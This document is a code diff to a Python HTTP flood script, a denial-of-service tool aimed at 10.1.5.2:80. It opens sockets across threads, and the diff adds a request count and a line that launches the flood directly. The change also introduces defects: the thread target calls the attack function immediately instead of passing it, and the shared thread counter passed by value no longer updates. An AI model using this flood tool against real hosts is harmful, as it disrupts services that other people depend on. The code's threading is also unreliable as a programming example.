@@ -14,8 +14,7 @@ TARGET_IP = "10.1.5.2"
 port = 80
 
 # Print thread status
-def print_status():
-    global thread_num
+def print_status(thread_num, thread_num_mutex):
     thread_num_mutex.acquire(True)
 
     thread_num += 1
@@ -33,8 +32,8 @@ def generate_url_path():
 
 
 # Perform the request
-def attack():
-    print_status()
+def attack(thread_num, thread_num_mutex):
+    print_status(thread_num, thread_num_mutex)
     url_path = generate_url_path()
 
     # Create a raw socket
@@ -55,18 +54,16 @@ def attack():
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
 
-def http_flood(SOURCE_IP="10.1.5.3"):
-    num_requests = 0
-
+def http_flood(SOURCE_IP="10.1.5.3", count=100):
     # Create a shared variable for thread counts
     thread_num = 0
     thread_num_mutex = threading.Lock()
-    print (f"[#] Attack started on ({TARGET_IP} ) || Port: {str(port)} || # Requests: {str(num_requests)}")
+    print (f"[#] Attack started on ({TARGET_IP} ) || Port: {str(port)} || # Requests: {str(count)}")
 
     # Spawn a thread per request
     all_threads = []
-    for i in range(num_requests):
-        t1 = threading.Thread(target=attack)
+    for _ in range(count):
+        t1 = threading.Thread(target=attack(thread_num, thread_num_mutex))
         t1.start()
         all_threads.append(t1)
 
@@ -75,3 +72,5 @@ def http_flood(SOURCE_IP="10.1.5.3"):
 
     for current_thread in all_threads:
         current_thread.join()  # Make the main thread wait for the children threads
+
+http_flood("10.1.5.3", 100)
